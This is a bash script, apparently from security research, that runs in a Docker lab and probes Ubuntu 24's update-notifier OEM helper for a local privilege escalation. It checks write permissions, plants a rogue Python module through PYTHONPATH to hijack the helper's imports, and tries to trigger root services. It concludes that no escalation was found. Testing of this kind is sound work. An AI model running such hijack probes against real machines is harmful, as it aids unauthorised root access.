#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${TARGET:-ubuntu24-server-lpe-target}"
ATTACKER="${ATTACKER:-attacker}"
SELFAUTH="${SELFAUTH:-selfauth}"

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="${LOG:-$WORKSPACE/logs/ubuntu-drivers-oem-helper.out}"

mkdir -p "$(dirname -- "$LOG")"
: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

run() {
  printf '\n$'
  printf ' %q' "$@"
  printf '\n'
  set +e
  "$@"
  local rc=$?
  set -e
  printf 'rc=%s\n' "$rc"
  return 0
}

target_root() {
  run docker exec "$TARGET" bash -lc "$1"
}

target_user() {
  local user="$1"
  local cmd="$2"
  run docker exec "$TARGET" runuser -u "$user" -- bash -lc "$cmd"
}

echo "ubuntu-drivers/update-notifier OEM helper probe"
echo "target=$TARGET attacker=$ATTACKER selfauth=$SELFAUTH"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$TARGET" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $TARGET" >&2
  exit 1
fi

target_root '
set -euo pipefail
echo "== release and users =="
cat /etc/os-release | sed -n "1,8p"
uname -a
id attacker
id selfauth

echo
echo "== default package status =="
dpkg-query -W -f="\${binary:Package}\t\${Version}\t\${db:Status-Abbrev}\n" \
  ubuntu-drivers-common update-notifier update-notifier-common update-manager-core \
  ubuntu-release-upgrader-core python3-apt python3-gi 2>&1 || true
apt-cache policy ubuntu-drivers-common update-notifier update-notifier-common 2>/dev/null | sed -n "1,80p" || true

echo
echo "== command/module presence =="
command -v ubuntu-drivers || echo "ubuntu-drivers=ABSENT"
command -v list-oem-metapackages || echo "list-oem-metapackages=not-on-PATH"
[ -x /usr/lib/update-notifier/list-oem-metapackages ] && echo "list-oem-helper=/usr/lib/update-notifier/list-oem-metapackages"
python3 - <<'"'"'PY'"'"'
import importlib.util
for name in ("UbuntuDrivers", "UbuntuDrivers.detect", "apt", "apt_pkg", "gi"):
    try:
        spec = importlib.util.find_spec(name)
    except Exception as exc:
        print(f"{name}=ERROR:{exc.__class__.__name__}:{exc}")
    else:
        print(f"{name}={spec.origin if spec else '"'"'MISSING'"'"'}")
PY
'

target_root '
set -euo pipefail
echo "== helper source =="
nl -ba /usr/lib/update-notifier/list-oem-metapackages | sed -n "1,90p"

echo
echo "== root update-notifier units and apt hooks =="
systemctl cat update-notifier-download.service update-notifier-download.timer \
  update-notifier-motd.service update-notifier-motd.timer --no-pager 2>&1 || true
echo
systemctl show update-notifier-download.service update-notifier-motd.service \
  -p Id -p LoadState -p ActiveState -p User -p Group -p ExecStart \
  -p Environment -p WorkingDirectory -p FragmentPath --no-pager 2>&1 || true
echo
for f in /etc/apt/apt.conf.d/99update-notifier /etc/update-motd.d/90-updates-available \
  /etc/update-motd.d/91-release-upgrade /etc/update-motd.d/95-hwe-eol \
  /etc/update-motd.d/98-fsck-at-reboot /etc/update-motd.d/98-reboot-required; do
  [ -e "$f" ] && echo "--- $f" && nl -ba "$f" | sed -n "1,120p"
done
'

target_root '
set -euo pipefail
echo "== references to OEM helper/runtime file =="
grep -RInE "list-oem-metapackages|ubuntu-drivers-oem\\.package-list|UbuntuDrivers|ubuntu-drivers|system_device_specific_metapackages|GLib.get_user_runtime_dir|XDG_RUNTIME_DIR" \
  /etc /usr/lib /usr/share /var/lib/dpkg/info 2>/dev/null | sed -n "1,240p" || true
'

target_root '
set -euo pipefail
echo "== writable/default cache and package-data paths =="
for p in \
  /usr/lib/update-notifier/list-oem-metapackages \
  /usr/share/package-data-downloads \
  /var/lib/update-notifier \
  /var/lib/update-notifier/user.d \
  /var/lib/update-notifier/package-data-downloads \
  /var/lib/update-notifier/package-data-downloads/partial \
  /var/lib/ubuntu-drivers-common \
  /var/cache/ubuntu-drivers-common \
  /run/user/1001 \
  /run/user/1002 \
  /tmp; do
  [ -e "$p" ] && stat -Lc "%A %U:%G %n" "$p" || echo "MISSING $p"
done
echo
echo "attacker write attempts:"
for p in \
  /usr/share/package-data-downloads/attacker-oem-probe \
  /var/lib/update-notifier/attacker-oem-probe \
  /var/lib/update-notifier/user.d/attacker-oem-probe \
  /var/lib/update-notifier/package-data-downloads/attacker-oem-probe \
  /var/lib/ubuntu-drivers-common/attacker-oem-probe \
  /var/cache/ubuntu-drivers-common/attacker-oem-probe; do
  runuser -u attacker -- sh -c "touch \"\$1\"" sh "$p" 2>&1 && echo "WRITE_OK $p" || echo "WRITE_DENIED $p"
done
find /etc /run /var/lib /var/cache /usr/lib /usr/share -xdev \( -iname "*ubuntu-drivers*" -o -iname "*oem*" \) \
  -maxdepth 5 -printf "%M %u:%g %p\n" 2>/dev/null | sort | sed -n "1,200p"
'

target_root '
set -euo pipefail
echo "== direct helper execution in default state =="
set +e
/usr/lib/update-notifier/list-oem-metapackages 2>&1
root_rc=$?
runuser -u attacker -- env -i HOME=/home/attacker USER=attacker LOGNAME=attacker \
  PATH=/usr/sbin:/usr/bin:/sbin:/bin /usr/lib/update-notifier/list-oem-metapackages 2>&1
attacker_rc=$?
set -e
echo "root_rc=$root_rc"
echo "attacker_rc=$attacker_rc"
'

target_user "$ATTACKER" '
set -euo pipefail
echo "== direct attacker-controlled runtime/import proof =="
work=/home/attacker/ubuntu-drivers-oem-probe
rm -rf "$work"
mkdir -p "$work/UbuntuDrivers" "$work/runtime"
chmod 700 "$work/runtime"
cat > "$work/UbuntuDrivers/__init__.py" <<PY
PY
cat > "$work/UbuntuDrivers/detect.py" <<PY
import os
with open("/home/attacker/ubuntu-drivers-oem-probe/import-marker", "a") as f:
    f.write("uid=%s euid=%s\\n" % (os.getuid(), os.geteuid()))
def system_device_specific_metapackages(apt_cache=None):
    return ["oem-attacker-direct-meta"]
PY
set +e
env -i HOME=/home/attacker USER=attacker LOGNAME=attacker PATH=/usr/sbin:/usr/bin:/sbin:/bin \
  PYTHONPATH="$work" XDG_RUNTIME_DIR="$work/runtime" \
  /usr/lib/update-notifier/list-oem-metapackages 2>&1
direct_rc=$?
set -e
echo "direct_rc=$direct_rc"
find "$work" -maxdepth 3 -printf "%M %u:%g %p\n" | sort
echo "--- import marker"
cat "$work/import-marker" 2>/dev/null || true; echo
echo "--- package list"
cat "$work/runtime/ubuntu-drivers-oem.package-list" 2>/dev/null || true; echo
'

target_user "$ATTACKER" '
set -euo pipefail
echo "== unprivileged root-service trigger attempts =="
set +e
systemctl start update-notifier-download.service 2>&1
download_start_rc=$?
systemctl start update-notifier-motd.service 2>&1
motd_start_rc=$?
set -e
echo "download_start_rc=$download_start_rc"
echo "motd_start_rc=$motd_start_rc"
'

target_root '
set -euo pipefail
echo "== root service execution proof =="
rm -f /root/ubuntu-drivers-oem-helper-root-marker
systemctl reset-failed update-notifier-download.service update-notifier-motd.service 2>/dev/null || true
systemctl start update-notifier-download.service update-notifier-motd.service 2>&1 || true
systemctl show update-notifier-download.service update-notifier-motd.service \
  -p Id -p ActiveState -p Result -p ExecMainCode -p ExecMainStatus --no-pager 2>&1 || true
if [ -e /root/ubuntu-drivers-oem-helper-root-marker ]; then
  echo "ROOT_MARKER_PRESENT"
  stat -Lc "%A %U:%G %n" /root/ubuntu-drivers-oem-helper-root-marker
else
  echo "ROOT_MARKER_ABSENT"
fi
'

target_root '
set -euo pipefail
echo "== cleanup =="
rm -rf /home/attacker/ubuntu-drivers-oem-probe
rm -f /root/ubuntu-drivers-oem-helper-root-marker
find /home/attacker /tmp /root -maxdepth 2 \( -name "*ubuntu-drivers-oem*" -o -name "*oemprobe*" \) -printf "%M %u:%g %p\n" 2>/dev/null || true
systemctl is-system-running || true
systemctl --failed --no-legend || true
'

echo
echo "RESULT: no validated uid1001/uid1002-to-root LPE in this lane"
